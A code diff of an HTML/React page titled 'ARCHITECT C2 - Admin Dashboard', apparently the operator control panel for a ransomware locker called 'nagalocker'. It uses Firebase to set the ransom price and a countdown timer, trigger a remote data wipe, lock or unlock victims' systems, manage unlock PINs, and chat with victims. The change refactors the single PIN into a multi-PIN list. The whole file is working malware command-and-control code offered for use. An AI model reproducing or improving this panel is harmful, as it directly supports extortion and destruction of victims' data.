@@ -4,38 +4,25 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ARCHITECT C2 - Admin Dashboard</title>
-    <!-- Tailwind CSS buat UI sangar -->
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- Lucide Icons buat estetika hacker -->
     <script src="https://unpkg.com/lucide@latest"></script>
-    <!-- React & Babel CDN -->
     <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
     <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
     <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
-    
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono&display=swap');
         body { font-family: 'JetBrains Mono', monospace; background-color: #020617; color: #cbd5e1; }
         .font-orbit { font-family: 'Orbitron', sans-serif; }
-        .glow-red { text-shadow: 0 0 10px #ef4444; }
-        .glow-green { text-shadow: 0 0 15px #22c55e; }
         .glass { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(51, 65, 85, 0.3); }
         .scrollbar-hide::-webkit-scrollbar { display: none; }
-        /* Animasi loading kustom */
-        @keyframes pulse-red {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        .loading-pulse { animation: pulse-red 2s infinite; }
     </style>
 </head>
 <body>
     <div id="root"></div>
 
-    <!-- Firebase Module Script -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getFirestore, doc, onSnapshot, updateDoc, arrayUnion, getDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+        import { getFirestore, doc, onSnapshot, updateDoc, arrayUnion, arrayRemove, setDoc, getDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
         import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
 
         const firebaseConfig = {
@@ -48,229 +35,166 @@
             measurementId: "G-S98ECJN5LY"
         };
 
-        // Ekspor ke window agar React bisa akses
         window.FirebaseLib = {
             app: initializeApp(firebaseConfig),
-            getFirestore, doc, onSnapshot, updateDoc, arrayUnion, getDoc,
+            getFirestore, doc, onSnapshot, updateDoc, arrayUnion, arrayRemove, setDoc, getDoc,
             getAuth, signInAnonymously, onAuthStateChanged
         };
-        
         window.dispatchEvent(new Event('firebase-ready'));
     </script>
 
-    <!-- React App Script (Babel) -->
     <script type="text/babel">
         const { useState, useEffect } = React;
 
         function App() {
             const [fbReady, setFbReady] = useState(false);
+            const [user, setUser] = useState(null);
             const [state, setState] = useState({
-                timeLeft: 1800,
-                ransom: '300.000',
-                messages: [],
-                isWiping: false,
-                isLocked: true,
-                correctPin: '1234'
+                timeLeft: 1800, ransom: '300.000', messages: [],
+                isWiping: false, isLocked: true, validPins: []
             });
             const [input, setInput] = useState('');
-            const [isOnline, setIsOnline] = useState(false);
+            const [newPin, setNewPin] = useState('');
+            
+            const docPath = ["artifacts", "nagalocker", "public", "data", "locker_state", "current"];
 
             useEffect(() => {
                 const handleReady = () => setFbReady(true);
                 if (window.FirebaseLib) handleReady();
                 else window.addEventListener('firebase-ready', handleReady);
-                return () => window.removeEventListener('firebase-ready', handleReady);
             }, []);
 
             useEffect(() => {
                 if (!fbReady) return;
-                const { getAuth, signInAnonymously, onAuthStateChanged, getFirestore, doc, onSnapshot } = window.FirebaseLib;
-                
-                const auth = getAuth();
-                signInAnonymously(auth);
-                
-                const unsubAuth = onAuthStateChanged(auth, (user) => {
-                    if (user) {
-                        setIsOnline(true);
-                        const db = getFirestore();
-                        const docRef = doc(db, "artifacts", "naga-locker-real-v1", "public", "data", "locker_state");
-                        
-                        const unsubSnap = onSnapshot(docRef, (s) => {
-                            if (s.exists()) setState(s.data());
-                        });
-                        return () => unsubSnap();
-                    }
-                });
-                
-                return () => unsubAuth();
+                const { getAuth, signInAnonymously, getFirestore, doc, onSnapshot } = window.FirebaseLib;
+                signInAnonymously(getAuth());
+                const db = getFirestore();
+                const docRef = doc(db, ...docPath);
+
+                return onSnapshot(docRef, (s) => s.exists() && setState(s.data()));
             }, [fbReady]);
 
             const updateField = async (field, value) => {
-                if (!fbReady) return;
                 const { getFirestore, doc, updateDoc } = window.FirebaseLib;
                 const db = getFirestore();
-                const docRef = doc(db, "artifacts", "naga-locker-real-v1", "public", "data", "locker_state");
-                await updateDoc(docRef, { [field]: value });
+                await updateDoc(doc(db, ...docPath), { [field]: value });
+            };
+
+            const addPin = async () => {
+                if (!newPin.trim()) return;
+                const { getFirestore, doc, updateDoc, arrayUnion } = window.FirebaseLib;
+                const db = getFirestore();
+                await updateDoc(doc(db, ...docPath), {
+                    validPins: arrayUnion(newPin)
+                });
+                setNewPin('');
+            };
+
+            const removePin = async (pin) => {
+                const { getFirestore, doc, updateDoc, arrayRemove } = window.FirebaseLib;
+                const db = getFirestore();
+                await updateDoc(doc(db, ...docPath), {
+                    validPins: arrayRemove(pin)
+                });
             };
 
             const sendMsg = async () => {
-                if (!input.trim() || !fbReady) return;
+                if (!input.trim()) return;
                 const { getFirestore, doc, updateDoc, arrayUnion } = window.FirebaseLib;
                 const db = getFirestore();
-                const docRef = doc(db, "artifacts", "naga-locker-real-v1", "public", "data", "locker_state");
-                await updateDoc(docRef, {
+                await updateDoc(doc(db, ...docPath), {
                     messages: arrayUnion({ sender: 'Hacker', text: input, time: Date.now() })
                 });
                 setInput('');
             };
 
-            // Trigger Lucide icons after state change
-            useEffect(() => {
-                if (window.lucide) lucide.createIcons();
-            }, [state, fbReady]);
+            useEffect(() => { window.lucide && lucide.createIcons(); }, [state]);
 
-            if (!fbReady) return (
-                <div className="min-h-screen bg-slate-950 flex flex-col items-center justify-center text-slate-500 font-orbit">
-                    <div className="w-16 h-16 border-4 border-red-600 border-t-transparent rounded-full animate-spin mb-4"></div>
-                    <p className="loading-pulse uppercase tracking-[0.3em] text-xs">Establishing C2 Connection...</p>
-                </div>
-            );
+            if (!fbReady) return <div className="min-h-screen bg-slate-950 flex items-center justify-center text-slate-500 font-orbit">ESTABLISHING C2...</div>;
 
             return (
                 <div className="min-h-screen p-4 lg:p-8 flex flex-col max-w-7xl mx-auto">
-                    {/* Header Dashboard */}
-                    <header className="flex flex-col md:flex-row justify-between items-center glass p-6 rounded-[2rem] mb-8 shadow-2xl">
-                        <div className="flex items-center gap-4 mb-4 md:mb-0">
-                            <div className="bg-red-600 p-3 rounded-2xl shadow-lg shadow-red-900/40">
-                                <i data-lucide="user-cog" className="text-white w-8 h-8"></i>
-                            </div>
+                    <header className="flex justify-between items-center glass p-6 rounded-[2rem] mb-8 shadow-2xl border border-slate-800">
+                        <div className="flex items-center gap-4">
+                            <div className="bg-red-600 p-3 rounded-2xl"><i data-lucide="user-cog" className="text-white w-8 h-8"></i></div>
                             <div>
                                 <h1 className="text-2xl font-black text-white italic tracking-tighter font-orbit uppercase">Architect C2</h1>
-                                <p className="text-[10px] text-slate-500 uppercase tracking-widest">
-                                    Status Server: <span className={isOnline ? "text-green-500 glow-green" : "text-red-500"}>
-                                        {isOnline ? "ONLINE" : "OFFLINE"}
-                                    </span>
-                                </p>
+                                <p className="text-[10px] text-slate-500 uppercase font-black">Node: <span className="text-green-500">ACTIVE</span></p>
                             </div>
                         </div>
-                        <div className="flex items-center gap-4">
-                            <div className="text-right mr-2">
-                                <p className="text-[10px] text-slate-500 font-bold uppercase">Target System</p>
-                                <p className={`text-xs font-black font-orbit ${state.isLocked ? 'text-red-500 glow-red' : 'text-green-500 glow-green'}`}>
-                                    {state.isLocked ? 'ENCRYPTED' : 'DECRYPTED'}
-                                </p>
-                            </div>
-                            <button onClick={() => window.location.reload()} className="p-3 bg-slate-800 rounded-xl hover:bg-slate-700 transition-all active:scale-95">
-                                <i data-lucide="refresh-cw" className="w-5 h-5"></i>
-                            </button>
+                        <div className="text-right">
+                            <p className="text-[10px] text-slate-500 font-bold uppercase">Target OS</p>
+                            <p className={`text-xs font-black font-orbit ${state.isLocked ? 'text-red-500' : 'text-green-500'}`}>{state.isLocked ? 'LOCKED' : 'DECRYPTED'}</p>
                         </div>
                     </header>
 
                     <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 flex-1">
-                        {/* Panel Kontrol Utama */}
                         <div className="lg:col-span-2 space-y-6">
-                            <section className="glass p-8 rounded-[2.5rem] shadow-xl relative overflow-hidden">
-                                <div className="absolute top-0 right-0 p-8 opacity-5">
-                                    <i data-lucide="shield-alert" className="w-32 h-32"></i>
-                                </div>
-                                <h2 className="text-xs font-black text-slate-500 uppercase tracking-[0.2em] mb-8 flex items-center gap-2">
-                                    <i data-lucide="terminal" className="w-4 h-4"></i> Remote Payload Management
+                            <section className="glass p-8 rounded-[2.5rem] shadow-xl">
+                                <h2 className="text-xs font-black text-slate-500 uppercase tracking-widest mb-8 flex items-center gap-2">
+                                    <i data-lucide="zap" className="w-4 h-4"></i> Remote Payload
                                 </h2>
-                                
-                                <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
+                                <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
                                     <div className="bg-black/40 p-6 rounded-3xl border border-slate-800">
-                                        <p className="text-[10px] text-slate-500 mb-2 font-bold uppercase tracking-widest">Sisa Waktu</p>
+                                        <p className="text-[10px] text-slate-500 mb-2 font-bold uppercase">Time Left (Mins)</p>
                                         <div className="flex items-center justify-between">
-                                            <span className="text-2xl font-black text-red-500 font-orbit tracking-widest">
-                                                {Math.floor(state.timeLeft / 60)}:{(state.timeLeft % 60).toString().padStart(2, '0')}
-                                            </span>
-                                            <div className="flex gap-1">
-                                                <button onClick={() => updateField('timeLeft', Math.max(0, state.timeLeft - 300))} className="p-2 bg-slate-800 rounded-lg hover:bg-red-900/40 transition-colors">
-                                                    <i data-lucide="minus" className="w-4 h-4"></i>
-                                                </button>
-                                                <button onClick={() => updateField('timeLeft', state.timeLeft + 300)} className="p-2 bg-slate-800 rounded-lg hover:bg-green-900/40 transition-colors">
-                                                    <i data-lucide="plus" className="w-4 h-4"></i>
-                                                </button>
+                                            <span className="text-2xl font-black text-red-500 font-orbit">{Math.floor(state.timeLeft / 60)}m</span>
+                                            <div className="flex gap-2">
+                                                <button onClick={() => updateField('timeLeft', Math.max(0, state.timeLeft - 300))} className="p-2 bg-slate-800 rounded-lg hover:bg-red-900/40">-5</button>
+                                                <button onClick={() => updateField('timeLeft', state.timeLeft + 300)} className="p-2 bg-slate-800 rounded-lg hover:bg-green-900/40">+5</button>
                                             </div>
                                         </div>
                                     </div>
                                     <div className="bg-black/40 p-6 rounded-3xl border border-slate-800">
-                                        <p className="text-[10px] text-slate-500 mb-2 font-bold uppercase tracking-widest">Harga Tebusan</p>
-                                        <input 
-                                            className="bg-transparent border-b border-slate-700 w-full text-xl font-black text-white outline-none focus:border-red-600 transition-all font-orbit" 
-                                            value={state.ransom} 
-                                            onChange={(e) => updateField('ransom', e.target.value)} 
-                                        />
-                                    </div>
-                                    <div className="bg-black/40 p-6 rounded-3xl border border-slate-800">
-                                        <p className="text-[10px] text-slate-500 mb-2 font-bold uppercase tracking-widest">Kunci Dekripsi (PIN)</p>
-                                        <input 
-                                            className="bg-transparent border-b border-slate-700 w-full text-xl font-black text-green-500 outline-none focus:border-green-600 transition-all font-mono" 
-                                            value={state.correctPin} 
-                                            onChange={(e) => updateField('correctPin', e.target.value)} 
-                                        />
+                                        <p className="text-[10px] text-slate-500 mb-2 font-bold uppercase tracking-widest">Ransom Price</p>
+                                        <input className="bg-transparent border-b border-slate-700 w-full text-xl font-black text-white outline-none focus:border-red-600 font-orbit" value={state.ransom} onChange={(e) => updateField('ransom', e.target.value)} />
                                     </div>
                                 </div>
-
-                                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                                    <button 
-                                        onClick={() => updateField('isWiping', !state.isWiping)} 
-                                        className={`py-5 rounded-2xl font-black text-xs transition-all uppercase tracking-[0.2em] shadow-lg ${state.isWiping ? 'bg-red-600 animate-pulse text-white' : 'bg-slate-800 text-red-500 hover:bg-red-600 hover:text-white'}`}
-                                    >
-                                        {state.isWiping ? 'ABORT DATA WIPE' : 'EXECUTE DATA WIPE'}
+                                <div className="grid grid-cols-2 gap-4">
+                                    <button onClick={() => updateField('isWiping', !state.isWiping)} className={`py-5 rounded-2xl font-black text-xs transition-all uppercase tracking-widest ${state.isWiping ? 'bg-red-600 animate-pulse text-white' : 'bg-slate-800 text-red-500 hover:bg-red-600 hover:text-white'}`}>
+                                        {state.isWiping ? 'Stop Wiping' : 'Execute Wipe'}
                                     </button>
-                                    <button 
-                                        onClick={() => updateField('isLocked', !state.isLocked)} 
-                                        className={`py-5 rounded-2xl font-black text-xs transition-all uppercase tracking-[0.2em] shadow-lg ${state.isLocked ? 'bg-slate-800 text-green-500 hover:bg-green-600 hover:text-white' : 'bg-green-600 text-black'}`}
-                                    >
-                                        {state.isLocked ? 'FORCE SYSTEM UNLOCK' : 'RE-LOCK TARGET'}
+                                    <button onClick={() => updateField('isLocked', !state.isLocked)} className={`py-5 rounded-2xl font-black text-xs transition-all uppercase tracking-widest ${state.isLocked ? 'bg-slate-800 text-green-500 hover:bg-green-600 hover:text-white' : 'bg-green-600 text-black'}`}>
+                                        {state.isLocked ? 'Force Unlock' : 'Re-Lock'}
                                     </button>
                                 </div>
                             </section>
 
-                            {/* Session Stats */}
                             <section className="glass p-8 rounded-[2.5rem] shadow-xl">
-                                <h2 className="text-xs font-black text-slate-500 uppercase tracking-widest mb-6 flex items-center gap-2">
-                                    <i data-lucide="activity" className="w-4 h-4"></i> Network Metrics
-                                </h2>
-                                <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-center">
-                                    <div className="bg-black/20 p-4 rounded-2xl"><p className="text-[8px] text-slate-600 uppercase font-black mb-1">Architecture</p><p className="text-xs font-bold font-orbit">ARM64-V8A</p></div>
-                                    <div className="bg-black/20 p-4 rounded-2xl"><p className="text-[8px] text-slate-600 uppercase font-black mb-1">Encryption</p><p className="text-xs font-bold text-blue-500 font-orbit">AES-256</p></div>
-                                    <div className="bg-black/20 p-4 rounded-2xl"><p className="text-[8px] text-slate-600 uppercase font-black mb-1">Latency</p><p className="text-xs font-bold text-green-500 font-orbit">12MS</p></div>
-                                    <div className="bg-black/20 p-4 rounded-2xl"><p className="text-[8px] text-slate-600 uppercase font-black mb-1">Protocol</p><p className="text-xs font-bold font-orbit text-yellow-500">WSS/C2</p></div>
+                                <h2 className="text-xs font-black text-slate-500 uppercase tracking-widest mb-6">Database PIN (Multi-Access)</h2>
+                                <div className="flex gap-2 mb-6">
+                                    <input value={newPin} onChange={(e) => setNewPin(e.target.value)} placeholder="Input PIN Baru..." className="flex-1 bg-black/50 border border-slate-800 p-4 rounded-xl text-white outline-none focus:border-green-600 font-mono" />
+                                    <button onClick={addPin} className="bg-green-600 text-black px-8 rounded-xl font-black text-xs uppercase shadow-lg shadow-green-900/20">Tambah</button>
+                                </div>
+                                <div className="flex flex-wrap gap-2 max-h-40 overflow-y-auto scrollbar-hide">
+                                    {state.validPins && state.validPins.map((p, i) => (
+                                        <div key={i} className="bg-slate-800 border border-slate-700 px-4 py-2 rounded-lg flex items-center gap-4 text-xs font-black group">
+                                            <span className="text-green-500 font-mono">{p}</span>
+                                            <button onClick={() => removePin(p)} className="text-red-500 opacity-30 group-hover:opacity-100 transition-opacity">×</button>
+                                        </div>
+                                    ))}
+                                    {(!state.validPins || state.validPins.length === 0) && <p className="text-[10px] text-slate-600 italic">Database PIN kosong. Target tidak bisa unlock.</p>}
                                 </div>
                             </section>
                         </div>
 
-                        {/* Chat Panel Interceptor */}
-                        <div className="glass p-6 rounded-[2.5rem] flex flex-col h-[600px] shadow-xl">
-                            <h2 className="text-xs font-black text-slate-500 uppercase tracking-[0.2em] mb-6 flex items-center gap-2 p-2">
+                        <div className="glass p-6 rounded-[2.5rem] flex flex-col h-[600px] shadow-2xl">
+                            <h2 className="text-xs font-black text-slate-500 uppercase tracking-widest mb-6 p-2 flex items-center gap-2">
                                 <i data-lucide="message-square" className="w-4 h-4 text-red-500"></i> Victim Comms
                             </h2>
-                            <div className="flex-1 overflow-y-auto mb-6 space-y-4 bg-black/30 p-4 rounded-3xl border border-slate-800/30 scrollbar-hide px-3">
-                                {state.messages.length === 0 && <p className="text-center text-[10px] text-slate-700 mt-20 italic">Menunggu transmisi pesan...</p>}
-                                {state.messages.map((m, i) => (
+                            <div className="flex-1 overflow-y-auto mb-6 space-y-4 bg-black/30 p-4 rounded-3xl border border-slate-800/30 scrollbar-hide text-[11px]">
+                                {state.messages && state.messages.map((m, i) => (
                                     <div key={i} className={`flex flex-col ${m.sender === 'Hacker' ? 'items-end' : 'items-start'}`}>
-                                        <div className={`max-w-[85%] p-3 rounded-2xl text-[11px] leading-relaxed shadow-sm ${m.sender === 'Hacker' ? 'bg-red-600 text-white shadow-red-900/30' : 'bg-slate-800 text-slate-200 border border-slate-700'}`}>
+                                        <div className={`max-w-[85%] p-3 rounded-2xl ${m.sender === 'Hacker' ? 'bg-red-600 text-white shadow-lg shadow-red-900/20' : 'bg-slate-800 text-slate-200 border border-slate-700'}`}>
                                             {m.text}
                                         </div>
-                                        <span className="text-[8px] text-slate-600 mt-1 uppercase font-black tracking-tighter mx-2">
-                                            {m.sender} • {new Date(m.time).toLocaleTimeString()}
-                                        </span>
+                                        <span className="text-[8px] text-slate-600 mt-1 uppercase font-black tracking-tighter mx-2">{m.sender}</span>
                                     </div>
                                 ))}
                             </div>
                             <div className="flex gap-2">
-                                <input 
-                                    value={input} 
-                                    onChange={(e) => setInput(e.target.value)} 
-                                    onKeyDown={(e) => e.key === 'Enter' && sendMsg()} 
-                                    placeholder="Kirim ancaman/pesan..." 
-                                    className="flex-1 bg-black/50 border border-slate-800 p-4 text-xs rounded-2xl outline-none focus:border-red-600 transition-all text-white placeholder-slate-700 shadow-inner" 
-                                />
-                                <button onClick={sendMsg} className="bg-red-600 p-4 rounded-2xl hover:bg-red-700 transition-all shadow-lg active:scale-95">
-                                    <i data-lucide="send" className="text-white w-5 h-5"></i>
-                                </button>
+                                <input value={input} onChange={(e) => setInput(e.target.value)} onKeyDown={(e) => e.key === 'Enter' && sendMsg()} placeholder="Ketik balasan..." className="flex-1 bg-black border border-slate-800 p-4 text-xs rounded-2xl outline-none text-white focus:border-red-600 transition-all shadow-inner" />
+                                <button onClick={sendMsg} className="bg-red-600 p-4 rounded-2xl hover:bg-red-700 transition-all active:scale-95 shadow-lg"><i data-lucide="send" className="text-white w-5 h-5"></i></button>
                             </div>
                         </div>
                     </div>
@@ -278,13 +202,8 @@
             );
         }
 
-        const root = ReactDOM.createRoot(document.getElementById('root'));
-        root.render(<App />);
-        
-        // Inisialisasi ikon secara berkala untuk memastikan semuanya tampil
-        setInterval(() => {
-            if (window.lucide) lucide.createIcons();
-        }, 1000);
+        ReactDOM.createRoot(document.getElementById('root')).render(<App />);
+        setInterval(() => window.lucide && lucide.createIcons(), 1000);
     </script>
 </body>
 </html>
